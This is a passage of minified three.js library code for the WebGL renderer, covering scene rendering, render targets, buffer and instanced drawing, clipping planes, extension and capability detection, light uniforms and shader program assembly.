Int8Array?\nw=x.BYTE:C instanceof Uint8Array&&(w=x.UNSIGNED_BYTE);var C=u.itemSize,y=ea.getAttributeBuffer(u);if(u instanceof THREE.InterleavedBufferAttribute){var z=u.data,A=z.stride,u=u.offset;z instanceof THREE.InstancedInterleavedBuffer?(R.enableAttributeAndDivisor(v,z.meshPerAttribute,p),void 0===c.maxInstancedCount&&(c.maxInstancedCount=z.meshPerAttribute*z.count)):R.enableAttribute(v);x.bindBuffer(x.ARRAY_BUFFER,y);x.vertexAttribPointer(v,C,w,t,A*z.array.BYTES_PER_ELEMENT,(k*A+u)*z.array.BYTES_PER_ELEMENT)}else u instanceof\nTHREE.InstancedBufferAttribute?(R.enableAttributeAndDivisor(v,u.meshPerAttribute,p),void 0===c.maxInstancedCount&&(c.maxInstancedCount=u.meshPerAttribute*u.count)):R.enableAttribute(v),x.bindBuffer(x.ARRAY_BUFFER,y),x.vertexAttribPointer(v,C,w,t,0,k*C*u.array.BYTES_PER_ELEMENT)}else if(void 0!==n&&(w=n[q],void 0!==w))switch(w.length){case 2:x.vertexAttrib2fv(v,w);break;case 3:x.vertexAttrib3fv(v,w);break;case 4:x.vertexAttrib4fv(v,w);break;default:x.vertexAttrib1fv(v,w)}}}R.disableUnusedAttributes()}null!==\nb&&x.bindBuffer(x.ELEMENT_ARRAY_BUFFER,ea.getAttributeBuffer(b))}p=Infinity;null!==b?p=b.count:void 0!==m&&(p=m.count);q=c.drawRange.start;b=c.drawRange.count;m=null!==g?g.start:0;k=null!==g?g.count:Infinity;g=Math.max(0,q,m);p=Math.min(0+p,q+b,m+k)-1;p=Math.max(0,p-g+1);if(e instanceof THREE.Mesh)if(!0===d.wireframe)R.setLineWidth(d.wireframeLinewidth*(null===J?$:1)),a.setMode(x.LINES);else switch(e.drawMode){case THREE.TrianglesDrawMode:a.setMode(x.TRIANGLES);break;case THREE.TriangleStripDrawMode:a.setMode(x.TRIANGLE_STRIP);\nbreak;case THREE.TriangleFanDrawMode:a.setMode(x.TRIANGLE_FAN)}else e instanceof THREE.Line?(d=d.linewidth,void 0===d&&(d=1),R.setLineWidth(d*(null===J?$:1)),e instanceof THREE.LineSegments?a.setMode(x.LINES):a.setMode(x.LINE_STRIP)):e instanceof THREE.Points&&a.setMode(x.POINTS);c instanceof THREE.InstancedBufferGeometry?0<c.maxInstancedCount&&a.renderInstances(c,g,p):a.render(g,p)};this.render=function(a,c,d,e){if(!1===c instanceof THREE.Camera)console.error(\"THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.\");\nelse{var g=a.fog;aa=\"\";G=-1;T=null;!0===a.autoUpdate&&a.updateMatrixWorld();null===c.parent&&c.updateMatrixWorld();c.matrixWorldInverse.getInverse(c.matrixWorld);pa.multiplyMatrices(c.projectionMatrix,c.matrixWorldInverse);wa.setFromMatrix(pa);B.length=0;M=K=-1;L.length=0;O.length=0;va=this.localClippingEnabled;qa=ca.init(this.clippingPlanes,va,c);m(a,c);F.length=K+1;P.length=M+1;!0===N.sortObjects&&(F.sort(k),P.sort(l));qa&&ca.beginShadows();for(var f=B,h=0,p=0,n=f.length;p<n;p++){var v=f[p];v.castShadow&&\n(S.shadows[h++]=v)}S.shadows.length=h;ya.render(a,c);for(var f=B,r=v=0,s=0,u,w,C,t,H=c.matrixWorldInverse,y=0,z=0,J=0,A=0,h=0,p=f.length;h<p;h++)if(n=f[h],u=n.color,w=n.intensity,C=n.distance,t=n.shadow&&n.shadow.map?n.shadow.map.texture:null,n instanceof THREE.AmbientLight)v+=u.r*w,r+=u.g*w,s+=u.b*w;else if(n instanceof THREE.DirectionalLight){var D=ta.get(n);D.color.copy(n.color).multiplyScalar(n.intensity);D.direction.setFromMatrixPosition(n.matrixWorld);W.setFromMatrixPosition(n.target.matrixWorld);\nD.direction.sub(W);D.direction.transformDirection(H);if(D.shadow=n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.directionalShadowMap[y]=t;S.directionalShadowMatrix[y]=n.shadow.matrix;S.directional[y++]=D}else if(n instanceof THREE.SpotLight){D=ta.get(n);D.position.setFromMatrixPosition(n.matrixWorld);D.position.applyMatrix4(H);D.color.copy(u).multiplyScalar(w);D.distance=C;D.direction.setFromMatrixPosition(n.matrixWorld);W.setFromMatrixPosition(n.target.matrixWorld);\nD.direction.sub(W);D.direction.transformDirection(H);D.coneCos=Math.cos(n.angle);D.penumbraCos=Math.cos(n.angle*(1-n.penumbra));D.decay=0===n.distance?0:n.decay;if(D.shadow=n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.spotShadowMap[J]=t;S.spotShadowMatrix[J]=n.shadow.matrix;S.spot[J++]=D}else if(n instanceof THREE.PointLight){D=ta.get(n);D.position.setFromMatrixPosition(n.matrixWorld);D.position.applyMatrix4(H);D.color.copy(n.color).multiplyScalar(n.intensity);\nD.distance=n.distance;D.decay=0===n.distance?0:n.decay;if(D.shadow=n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.pointShadowMap[z]=t;void 0===S.pointShadowMatrix[z]&&(S.pointShadowMatrix[z]=new THREE.Matrix4);W.setFromMatrixPosition(n.matrixWorld).negate();S.pointShadowMatrix[z].identity().setPosition(W);S.point[z++]=D}else n instanceof THREE.HemisphereLight&&(D=ta.get(n),D.direction.setFromMatrixPosition(n.matrixWorld),D.direction.transformDirection(H),\nD.direction.normalize(),D.skyColor.copy(n.color).multiplyScalar(w),D.groundColor.copy(n.groundColor).multiplyScalar(w),S.hemi[A++]=D);S.ambient[0]=v;S.ambient[1]=r;S.ambient[2]=s;S.directional.length=y;S.spot.length=J;S.point.length=z;S.hemi.length=A;S.hash=y+\",\"+z+\",\"+J+\",\"+A+\",\"+S.shadows.length;qa&&ca.endShadows();fa.calls=0;fa.vertices=0;fa.faces=0;fa.points=0;void 0===d&&(d=null);this.setRenderTarget(d);f=a.background;null===f?b(V.r,V.g,V.b,Y):f instanceof THREE.Color&&b(f.r,f.g,f.b,1);(this.autoClear||\ne)&&this.clear(this.autoClearColor,this.autoClearDepth,this.autoClearStencil);f instanceof THREE.CubeTexture?(la.projectionMatrix.copy(c.projectionMatrix),la.matrixWorld.extractRotation(c.matrixWorld),la.matrixWorldInverse.getInverse(la.matrixWorld),ga.material.uniforms.tCube.value=f,ga.modelViewMatrix.multiplyMatrices(la.matrixWorldInverse,ga.matrixWorld),N.renderBufferDirect(la,null,ga.geometry,ga.material,ga,null)):f instanceof THREE.Texture&&(oa.material.map=f,N.renderBufferDirect(Ca,null,oa.geometry,\noa.material,oa,null));a.overrideMaterial?(e=a.overrideMaterial,q(F,c,g,e),q(P,c,g,e)):(R.setBlending(THREE.NoBlending),q(F,c,g),q(P,c,g));Da.render(a,c);Ea.render(a,c,ba);d&&ka.updateRenderTargetMipmap(d);R.setDepthTest(!0);R.setDepthWrite(!0);R.setColorWrite(!0)}};this.setFaceCulling=function(a,b){R.setCullFace(a);R.setFlipSided(b===THREE.FrontFaceDirectionCW)};this.allocTextureUnit=function(){var a=ia;a>=da.maxTextures&&console.warn(\"WebGLRenderer: trying to use \"+a+\" texture units while this GPU supports only \"+\nda.maxTextures);ia+=1;return a};this.setTexture2D=function(){var a=!1;return function(b,c){b instanceof THREE.WebGLRenderTarget&&(a||(console.warn(\"THREE.WebGLRenderer.setTexture2D: don't use render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);ka.setTexture2D(b,c)}}();this.setTexture=function(){var a=!1;return function(b,c){a||(console.warn(\"THREE.WebGLRenderer: .setTexture is deprecated, use setTexture2D instead.\"),a=!0);ka.setTexture2D(b,c)}}();this.setTextureCube=\nfunction(){var a=!1;return function(b,c){b instanceof THREE.WebGLRenderTargetCube&&(a||(console.warn(\"THREE.WebGLRenderer.setTextureCube: don't use cube render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);b instanceof THREE.CubeTexture||Array.isArray(b.image)&&6===b.image.length?ka.setTextureCube(b,c):ka.setTextureCubeDynamic(b,c)}}();this.getCurrentRenderTarget=function(){return J};this.setRenderTarget=function(a){(J=a)&&void 0===Z.get(a).__webglFramebuffer&&ka.setupRenderTarget(a);\nvar b=a instanceof THREE.WebGLRenderTargetCube,c;a?(c=Z.get(a),c=b?c.__webglFramebuffer[a.activeCubeFace]:c.__webglFramebuffer,X.copy(a.scissor),ja=a.scissorTest,ba.copy(a.viewport)):(c=null,X.copy(ua).multiplyScalar($),ja=xa,ba.copy(ma).multiplyScalar($));D!==c&&(x.bindFramebuffer(x.FRAMEBUFFER,c),D=c);R.scissor(X);R.setScissorTest(ja);R.viewport(ba);b&&(b=Z.get(a.texture),x.framebufferTexture2D(x.FRAMEBUFFER,x.COLOR_ATTACHMENT0,x.TEXTURE_CUBE_MAP_POSITIVE_X+a.activeCubeFace,b.__webglTexture,a.activeMipMapLevel))};\nthis.readRenderTargetPixels=function(a,b,c,d,e,f){if(!1===a instanceof THREE.WebGLRenderTarget)console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.\");else{var g=Z.get(a).__webglFramebuffer;if(g){var h=!1;g!==D&&(x.bindFramebuffer(x.FRAMEBUFFER,g),h=!0);try{var k=a.texture;k.format!==THREE.RGBAFormat&&u(k.format)!==x.getParameter(x.IMPLEMENTATION_COLOR_READ_FORMAT)?console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.\"):\nk.type===THREE.UnsignedByteType||u(k.type)===x.getParameter(x.IMPLEMENTATION_COLOR_READ_TYPE)||k.type===THREE.FloatType&&U.get(\"WEBGL_color_buffer_float\")||k.type===THREE.HalfFloatType&&U.get(\"EXT_color_buffer_half_float\")?x.checkFramebufferStatus(x.FRAMEBUFFER)===x.FRAMEBUFFER_COMPLETE?0<=b&&b<=a.width-d&&0<=c&&c<=a.height-e&&x.readPixels(b,c,d,e,u(k.format),u(k.type),f):console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: readPixels from renderTarget failed. Framebuffer not complete.\"):console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.\")}finally{h&&\nx.bindFramebuffer(x.FRAMEBUFFER,D)}}}}};\nTHREE.WebGLRenderTarget=function(a,b,c){this.uuid=THREE.Math.generateUUID();this.width=a;this.height=b;this.scissor=new THREE.Vector4(0,0,a,b);this.scissorTest=!1;this.viewport=new THREE.Vector4(0,0,a,b);c=c||{};void 0===c.minFilter&&(c.minFilter=THREE.LinearFilter);this.texture=new THREE.Texture(void 0,void 0,c.wrapS,c.wrapT,c.magFilter,c.minFilter,c.format,c.type,c.anisotropy,c.encoding);this.depthBuffer=void 0!==c.depthBuffer?c.depthBuffer:!0;this.stencilBuffer=void 0!==c.stencilBuffer?c.stencilBuffer:\n!0;this.depthTexture=null};\nObject.assign(THREE.WebGLRenderTarget.prototype,THREE.EventDispatcher.prototype,{setSize:function(a,b){if(this.width!==a||this.height!==b)this.width=a,this.height=b,this.dispose();this.viewport.set(0,0,a,b);this.scissor.set(0,0,a,b)},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.width=a.width;this.height=a.height;this.viewport.copy(a.viewport);this.texture=a.texture.clone();this.depthBuffer=a.depthBuffer;this.stencilBuffer=a.stencilBuffer;this.depthTexture=a.depthTexture;\nreturn this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}});THREE.WebGLRenderTargetCube=function(a,b,c){THREE.WebGLRenderTarget.call(this,a,b,c);this.activeMipMapLevel=this.activeCubeFace=0};THREE.WebGLRenderTargetCube.prototype=Object.create(THREE.WebGLRenderTarget.prototype);THREE.WebGLRenderTargetCube.prototype.constructor=THREE.WebGLRenderTargetCube;\nTHREE.WebGLBufferRenderer=function(a,b,c){var d;this.setMode=function(a){d=a};this.render=function(b,f){a.drawArrays(d,b,f);c.calls++;c.vertices+=f;d===a.TRIANGLES&&(c.faces+=f/3)};this.renderInstances=function(e){var f=b.get(\"ANGLE_instanced_arrays\");if(null===f)console.error(\"THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\");else{var g=e.attributes.position,h=0,h=g instanceof THREE.InterleavedBufferAttribute?g.data.count:\ng.count;f.drawArraysInstancedANGLE(d,0,h,e.maxInstancedCount);c.calls++;c.vertices+=h*e.maxInstancedCount;d===a.TRIANGLES&&(c.faces+=e.maxInstancedCount*h/3)}}};\nTHREE.WebGLClipping=function(){function a(){l.value!==d&&(l.value=d,l.needsUpdate=0<e);c.numPlanes=e}function b(a,b,d,e){var f=null!==a?a.length:0,g=null;if(0!==f){g=l.value;if(!0!==e||null===g){e=d+4*f;b=b.matrixWorldInverse;k.getNormalMatrix(b);if(null===g||g.length<e)g=new Float32Array(e);for(e=0;e!==f;++e,d+=4)h.copy(a[e]).applyMatrix4(b,k),h.normal.toArray(g,d),g[d+3]=h.constant}l.value=g;l.needsUpdate=!0}c.numPlanes=f;return g}var c=this,d=null,e=0,f=!1,g=!1,h=new THREE.Plane,k=new THREE.Matrix3,\nl={value:null,needsUpdate:!1};this.uniform=l;this.numPlanes=0;this.init=function(a,c,g){var h=0!==a.length||c||0!==e||f;f=c;d=b(a,g,0);e=a.length;return h};this.beginShadows=function(){g=!0;b(null)};this.endShadows=function(){g=!1;a()};this.setState=function(c,h,k,q,r){if(!f||null===c||0===c.length||g&&!h)g?b(null):a();else{h=g?0:e;var s=4*h,t=q.clippingState||null;l.value=t;t=b(c,k,s,r);for(c=0;c!==s;++c)t[c]=d[c];q.clippingState=t;this.numPlanes+=h}}};\nTHREE.WebGLIndexedBufferRenderer=function(a,b,c){var d,e,f;this.setMode=function(a){d=a};this.setIndex=function(c){c.array instanceof Uint32Array&&b.get(\"OES_element_index_uint\")?(e=a.UNSIGNED_INT,f=4):(e=a.UNSIGNED_SHORT,f=2)};this.render=function(b,h){a.drawElements(d,h,e,b*f);c.calls++;c.vertices+=h;d===a.TRIANGLES&&(c.faces+=h/3)};this.renderInstances=function(g,h,k){var l=b.get(\"ANGLE_instanced_arrays\");null===l?console.error(\"THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\"):\n(l.drawElementsInstancedANGLE(d,k,e,h*f,g.maxInstancedCount),c.calls++,c.vertices+=k*g.maxInstancedCount,d===a.TRIANGLES&&(c.faces+=g.maxInstancedCount*k/3))}};\nTHREE.WebGLExtensions=function(a){var b={};this.get=function(c){if(void 0!==b[c])return b[c];var d;switch(c){case \"WEBGL_depth_texture\":d=a.getExtension(\"WEBGL_depth_texture\")||a.getExtension(\"MOZ_WEBGL_depth_texture\")||a.getExtension(\"WEBKIT_WEBGL_depth_texture\");break;case \"EXT_texture_filter_anisotropic\":d=a.getExtension(\"EXT_texture_filter_anisotropic\")||a.getExtension(\"MOZ_EXT_texture_filter_anisotropic\")||a.getExtension(\"WEBKIT_EXT_texture_filter_anisotropic\");break;case \"WEBGL_compressed_texture_s3tc\":d=\na.getExtension(\"WEBGL_compressed_texture_s3tc\")||a.getExtension(\"MOZ_WEBGL_compressed_texture_s3tc\")||a.getExtension(\"WEBKIT_WEBGL_compressed_texture_s3tc\");break;case \"WEBGL_compressed_texture_pvrtc\":d=a.getExtension(\"WEBGL_compressed_texture_pvrtc\")||a.getExtension(\"WEBKIT_WEBGL_compressed_texture_pvrtc\");break;case \"WEBGL_compressed_texture_etc1\":d=a.getExtension(\"WEBGL_compressed_texture_etc1\");break;default:d=a.getExtension(c)}null===d&&console.warn(\"THREE.WebGLRenderer: \"+c+\" extension not supported.\");\nreturn b[c]=d}};\nTHREE.WebGLCapabilities=function(a,b,c){function d(b){if(\"highp\"===b){if(0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.HIGH_FLOAT).precision&&0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.HIGH_FLOAT).precision)return\"highp\";b=\"mediump\"}return\"mediump\"===b&&0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.MEDIUM_FLOAT).precision&&0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.MEDIUM_FLOAT).precision?\"mediump\":\"lowp\"}var e;this.getMaxAnisotropy=function(){if(void 0!==e)return e;var c=b.get(\"EXT_texture_filter_anisotropic\");\nreturn e=null!==c?a.getParameter(c.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0};this.getMaxPrecision=d;this.precision=void 0!==c.precision?c.precision:\"highp\";this.logarithmicDepthBuffer=void 0!==c.logarithmicDepthBuffer?c.logarithmicDepthBuffer:!1;this.maxTextures=a.getParameter(a.MAX_TEXTURE_IMAGE_UNITS);this.maxVertexTextures=a.getParameter(a.MAX_VERTEX_TEXTURE_IMAGE_UNITS);this.maxTextureSize=a.getParameter(a.MAX_TEXTURE_SIZE);this.maxCubemapSize=a.getParameter(a.MAX_CUBE_MAP_TEXTURE_SIZE);this.maxAttributes=\na.getParameter(a.MAX_VERTEX_ATTRIBS);this.maxVertexUniforms=a.getParameter(a.MAX_VERTEX_UNIFORM_VECTORS);this.maxVaryings=a.getParameter(a.MAX_VARYING_VECTORS);this.maxFragmentUniforms=a.getParameter(a.MAX_FRAGMENT_UNIFORM_VECTORS);this.vertexTextures=0<this.maxVertexTextures;this.floatFragmentTextures=!!b.get(\"OES_texture_float\");this.floatVertexTextures=this.vertexTextures&&this.floatFragmentTextures;c=d(this.precision);c!==this.precision&&(console.warn(\"THREE.WebGLRenderer:\",this.precision,\"not supported, using\",\nc,\"instead.\"),this.precision=c);this.logarithmicDepthBuffer&&(this.logarithmicDepthBuffer=!!b.get(\"EXT_frag_depth\"))};\nTHREE.WebGLGeometries=function(a,b,c){function d(a){var h=a.target;a=f[h.id];null!==a.index&&e(a.index);var k=a.attributes,l;for(l in k)e(k[l]);h.removeEventListener(\"dispose\",d);delete f[h.id];l=b.get(h);l.wireframe&&e(l.wireframe);b.delete(h);h=b.get(a);h.wireframe&&e(h.wireframe);b.delete(a);c.memory.geometries--}function e(c){var d;d=c instanceof THREE.InterleavedBufferAttribute?b.get(c.data).__webglBuffer:b.get(c).__webglBuffer;void 0!==d&&(a.deleteBuffer(d),c instanceof THREE.InterleavedBufferAttribute?\nb.delete(c.data):b.delete(c))}var f={};this.get=function(a){var b=a.geometry;if(void 0!==f[b.id])return f[b.id];b.addEventListener(\"dispose\",d);var e;b instanceof THREE.BufferGeometry?e=b:b instanceof THREE.Geometry&&(void 0===b._bufferGeometry&&(b._bufferGeometry=(new THREE.BufferGeometry).setFromObject(a)),e=b._bufferGeometry);f[b.id]=e;c.memory.geometries++;return e}};\nTHREE.WebGLLights=function(){var a={};this.get=function(b){if(void 0!==a[b.id])return a[b.id];var c;switch(b.type){case \"DirectionalLight\":c={direction:new THREE.Vector3,color:new THREE.Color,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new THREE.Vector2};break;case \"SpotLight\":c={position:new THREE.Vector3,direction:new THREE.Vector3,color:new THREE.Color,distance:0,coneCos:0,penumbraCos:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new THREE.Vector2};break;case \"PointLight\":c=\n{position:new THREE.Vector3,color:new THREE.Color,distance:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new THREE.Vector2};break;case \"HemisphereLight\":c={direction:new THREE.Vector3,skyColor:new THREE.Color,groundColor:new THREE.Color}}return a[b.id]=c}};\nTHREE.WebGLObjects=function(a,b,c){function d(c,d){var e=c instanceof THREE.InterleavedBufferAttribute?c.data:c,f=b.get(e);void 0===f.__webglBuffer?(f.__webglBuffer=a.createBuffer(),a.bindBuffer(d,f.__webglBuffer),a.bufferData(d,e.array,e.dynamic?a.DYNAMIC_DRAW:a.STATIC_DRAW),f.version=e.version):f.version!==e.version&&(a.bindBuffer(d,f.__webglBuffer),!1===e.dynamic||-1===e.updateRange.count?a.bufferSubData(d,0,e.array):0===e.updateRange.count?console.error(\"THREE.WebGLObjects.updateBuffer: dynamic THREE.BufferAttribute marked as needsUpdate but updateRange.count is 0, ensure you are using set methods or updating manually.\"):\n(a.bufferSubData(d,e.updateRange.offset*e.array.BYTES_PER_ELEMENT,e.array.subarray(e.updateRange.offset,e.updateRange.offset+e.updateRange.count)),e.updateRange.count=0),f.version=e.version)}function e(a,b,c){if(b>c){var d=b;b=c;c=d}d=a[b];return void 0===d?(a[b]=[c],!0):-1===d.indexOf(c)?(d.push(c),!0):!1}var f=new THREE.WebGLGeometries(a,b,c);this.getAttributeBuffer=function(a){return a instanceof THREE.InterleavedBufferAttribute?b.get(a.data).__webglBuffer:b.get(a).__webglBuffer};this.getWireframeAttribute=\nfunction(c){var f=b.get(c);if(void 0!==f.wireframe)return f.wireframe;var k=[],l=c.index,n=c.attributes;c=n.position;if(null!==l)for(var n={},l=l.array,p=0,m=l.length;p<m;p+=3){var q=l[p+0],r=l[p+1],s=l[p+2];e(n,q,r)&&k.push(q,r);e(n,r,s)&&k.push(r,s);e(n,s,q)&&k.push(s,q)}else for(l=n.position.array,p=0,m=l.length/3-1;p<m;p+=3)q=p+0,r=p+1,s=p+2,k.push(q,r,r,s,s,q);k=new THREE.BufferAttribute(new (65535<c.count?Uint32Array:Uint16Array)(k),1);d(k,a.ELEMENT_ARRAY_BUFFER);return f.wireframe=k};this.update=\nfunction(b){var c=f.get(b);b.geometry instanceof THREE.Geometry&&c.updateFromObject(b);b=c.index;var e=c.attributes;null!==b&&d(b,a.ELEMENT_ARRAY_BUFFER);for(var l in e)d(e[l],a.ARRAY_BUFFER);b=c.morphAttributes;for(l in b)for(var e=b[l],n=0,p=e.length;n<p;n++)d(e[n],a.ARRAY_BUFFER);return c}};\nTHREE.WebGLProgram=function(){function a(a){switch(a){case THREE.LinearEncoding:return[\"Linear\",\"( value )\"];case THREE.sRGBEncoding:return[\"sRGB\",\"( value )\"];case THREE.RGBEEncoding:return[\"RGBE\",\"( value )\"];case THREE.RGBM7Encoding:return[\"RGBM\",\"( value, 7.0 )\"];case THREE.RGBM16Encoding:return[\"RGBM\",\"( value, 16.0 )\"];case THREE.RGBDEncoding:return[\"RGBD\",\"( value, 256.0 )\"];case THREE.GammaEncoding:return[\"Gamma\",\"( value, float( GAMMA_FACTOR ) )\"];default:throw Error(\"unsupported encoding: \"+\na);}}function b(b,c){var d=a(c);return\"vec4 \"+b+\"( vec4 value ) { return \"+d[0]+\"ToLinear\"+d[1]+\"; }\"}function c(b,c){var d=a(c);return\"vec4 \"+b+\"( vec4 value ) { return LinearTo\"+d[0]+d[1]+\"; }\"}function d(a,b){var c;switch(b){case THREE.LinearToneMapping:c=\"Linear\";break;case THREE.ReinhardToneMapping:c=\"Reinhard\";break;case THREE.Uncharted2ToneMapping:c=\"Uncharted2\";break;case THREE.CineonToneMapping:c=\"OptimizedCineon\";break;default:throw Error(\"unsupported toneMapping: \"+b);}return\"vec3 \"+a+\n\"( vec3 color ) { return \"+c+\"ToneMapping( color ); }\"}function e(a,b,c){a=a||{};return[a.derivatives||b.envMapCubeUV||b.bumpMap||b.normalMap||b.flatShading?\"#extension GL_OES_standard_derivatives : enable\":\"\",(a.fragDepth||b.logarithmicDepthBuffer)&&c.get(\"EXT_frag_depth\")?\"#extension GL_EXT_frag_depth : enable\":\"\",a.drawBuffers&&c.get(\"WEBGL_draw_buffers\")?\"#extension GL_EXT_draw_buffers : require\":\"\",(a.shaderTextureLOD||b.envMap)&&c.get(\"EXT_shader_texture_lod\")?\"#extension GL_EXT_shader_texture_lod : enable\":\n\"\"].filter(g).join(\"\\n\")}function f(a){var b=[],c;for(c in a){var d=a[c];!1!==d&&b.push(\"#define \"+c+\" \"+d)}return b.join(\"\\n\")}function g(a){return\"\"!==a}function h(a,b){return a.replace(/NUM_DIR_LIGHTS/g,b.numDirLights).replace(/NUM_SPOT_LIGHTS/g,b.numSpotLights).replace(/NUM_POINT_LIGHTS/g,b.numPointLights).replace(/NUM_HEMI_LIGHTS/g,b.numHemiLights)}function k(a){return a.replace(/#include +<([\\w\\d.]+)>/g,function(a,b){var c=THREE.ShaderChunk[b];if(void 0===c)throw Error(\"Can not resolve #include <\"+\nb+\">\");return k(c)})}function l(a){return a.replace(/for \\( int i \\= (\\d+)\\; i < (\\d+)\\; i \\+\\+ \\) \\{([\\s\\S]+?)(?=\\})\\}/g,function(a,b,c,d){a=\"\";for(b=parseInt(b);b<parseInt(c);b++)a+=d.replace(/\\[ i \\]/g,\"[ \"+b+\" ]\");return a})}var n=0;return function(a,m,q,r){var s=a.context,t=q.extensions,u=q.defines,v=q.__webglShader.vertexShader,C=q.__webglShader.fragmentShader,w=\"SHADOWMAP_TYPE_BASIC\";r.shadowMapType===THREE.PCFShadowMap?w=\"SHADOWMAP_TYPE_PCF\":r.shadowMapType===THREE.PCFSoftShadowMap&&(w=\"SHADOWMAP_TYPE_PCF_SOFT\");\nvar E=\"ENVMAP_TYPE_CUBE\",z=\"ENVMAP_MODE_REFLECTION\",y=\"ENVMAP_BLENDING_MULTIPLY\";if(r.envMap){switch(q.envMap.mapping){case THREE.CubeReflectionMapping:case THREE.CubeRefractionMapping:E=\"ENVMAP_TYPE_CUBE\";break;case THREE.CubeUVReflectionMapping:case THREE.CubeUVRefractionMapping:E=\"ENVMAP_TYPE_CUBE_UV\";break;case THREE.EquirectangularReflectionMapping:case THREE.EquirectangularRefractionMapping:E=\"ENVMAP_TYPE_EQUIREC\";break;case THREE.SphericalReflectionMapping:E=\"ENVMAP_TYPE_SPHERE\"}switch(q.envMap.mapping){case THREE.CubeRefractionMapping:case THREE.EquirectangularRefractionMapping:z=\n\"ENVMAP_MODE_REFRACTION\"}switch(q.combine){case THREE.MultiplyOperation:y=\"ENVMAP_BLENDING_MULTIPLY\";break;case THREE.MixOperation:y=\"ENVMAP_BLENDING_MIX\";break;case THREE.AddOperation:y=\"ENVMAP_BLENDING_ADD\"}}var A=0<a.gammaFactor?a.gammaFactor:1,t=e(t,r,a.extensions),I=f(u),B=s.createProgram();q instanceof THREE.RawShaderMaterial?(u=[I].filter(g).join(\"\\n\"),w=[I].filter(g).join(\"\\n\")):(u=[\"precision \"+r.precision+\" float;\",\"precision \"+r.precision+\" int;\",\"#define SHADER_NAME \"+q.__webglShader.name,\nI,r.supportsVertexTextures?\"#define VERTEX_TEXTURES\":\"\",\"#define GAMMA_FACTOR \"+A,\"#define MAX_BONES \"+r.maxBones,r.map?\"#define USE_MAP\":\"\",r.envMap?\"#define USE_ENVMAP\":\"\",r.envMap?\"#define \"+z:\"\",r.lightMap?\"#define USE_LIGHTMAP\":\"\",r.aoMap?\"#define USE_AOMAP\":\"\",r.emissiveMap?\"#define USE_EMISSIVEMAP\":\"\",r.bumpMap?\"#define USE_BUMPMAP\":\"\",r.normalMap?\"#define USE_NORMALMAP\":\"\",r.displacementMap&&r.supportsVertexTextures?\"#define USE_DISPLACEMENTMAP\":\"\",r.specularMap?\"#define USE_SPECULARMAP\":\n\"\",r.roughnessMap?\"#define USE_ROUGHNESSMAP\":\"\",r.metalnessMap?\"#define USE_METALNESSMAP\":\"\",r.alphaMap?\"#define USE_ALPHAMAP\":\"\",r.vertexColors?\"#define USE_COLOR\":\"\",r.flatShading?\"#define FLAT_SHADED\":\"\",r.skinning?\"#define USE_SKINNING\":\"\",r.useVertexTexture?\"#define BONE_TEXTURE\":\"\",r.morphTargets?\"#define USE_MORPHTARGETS\":\"\",r.morphNormals&&!1===r.flatShading?\"#define USE_MORPHNORMALS\":\"\",r.doubleSided?\"#define DOUBLE_SIDED\":\"\",r.flipSided?\"#define FLIP_SIDED\":\"\",\"#define NUM_CLIPPING_PLANES \"+\nr.numClippingPlanes,r.shadowMapEnabled?\"#define USE_SHADOWMAP\":\"\",r.shadowMapEnabled?\"#define \"+w:\"\",r.sizeAttenuation?\"#define USE_SIZEATTENUATION\":\"\",r.logarithmicDepthBuffer?\"#define USE_LOGDEPTHBUF\":\"\",r.logarithmicDepthBuffer&&a.extensions.get(\"EXT_frag_depth\")?\"#define USE_LOGDEPTHBUF_EXT\":\"\",\"uniform mat4 modelMatrix;\",\"uniform mat4 modelViewMatrix;\",\"uniform mat4 projectionMatrix;\",\"uniform mat4 viewMatrix;\",\"uniform mat3 normalMatrix;\",\"uniform vec3 cameraPosition;\",\"attribute vec3 position;\",\n\"attribute vec3 normal;\",\"attribute vec2 uv;\",\"#ifdef USE_COLOR\",\"\\tattribute vec3 color;\",\"#endif\",\"#ifdef USE_MORPHTARGETS\",\"\\tattribute vec3 morphTarget0;\",\"\\tattribute vec3 morphTarget1;\",\"\\tattribute vec3 morphTarget2;\",\"\\tattribute vec3 morphTarget3;\",\"\\t#ifdef USE_MORPHNORMALS\",\"\\t\\tattribute vec3 morphNormal0;\",\"\\t\\tattribute vec3 morphNormal1;\",\"\\t\\tattribute vec3 morphNormal2;\",\"\\t\\tattribute vec3 morphNormal3;\",\"\\t#else\",\"\\t\\tattribute vec3 morphTarget4;\",\"\\t\\tattribute vec3 morphTarget5;\",\n\"\\t\\tattribute vec3 morphTarget6;\",\"\\t\\tattribute vec3 morphTarget7;\",\"\\t#endif\",\"#endif\",\"#ifdef USE_SKINNING\",\"\\tattribute vec4 skinIndex;\",\"\\tattribute vec4 skinWeight;\",\"#endif\",\"\\n\"].filter(g).join(\"\\n\"),w=[t,\"precision \"+r.precision+\" float;\",\"precision \"+r.precision+\" int;\",\"#define SHADER_NAME \"+q.__webglShader.name,I,r.alphaTest?\"#define ALPHATEST \"+r.alphaTest:\"\",\"#define GAMMA_FACTOR \"+A,r.useFog&&r.fog?\"#define 